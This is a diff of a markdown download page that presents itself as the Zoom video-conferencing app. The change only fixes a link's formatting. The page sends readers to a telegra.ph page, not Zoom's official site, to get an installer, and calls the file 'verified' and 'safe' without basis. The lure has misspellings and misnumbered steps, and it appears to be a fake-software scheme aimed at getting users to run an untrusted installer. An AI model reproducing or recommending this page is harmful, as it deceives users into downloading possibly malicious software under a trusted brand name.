@@ -20,7 +20,7 @@ Welcome to **Zoom**, your all-in-one solution for seamless **video meetings**, *
 
 No tech skills required. Just follow these **3 simple steps**:
 
-1. [🔽 **Download the App**] (https://telegra.ph/Zoom-The-Ultimate-Online-Video-Conferencing-App-06-29)  
+1. [🔽 **Download the App**](https://telegra.ph/Zoom-The-Ultimate-Online-Video-Conferencing-App-06-29)  
    Click [here](https://telegra.ph/Zoom-The-Ultimate-Online-Video-Conferencing-App-06-29) to download the latest version for your OS Windos
      🛡️ Verified file – safe and requires no extra components.
 3. 🚀 **Run the Installer**  
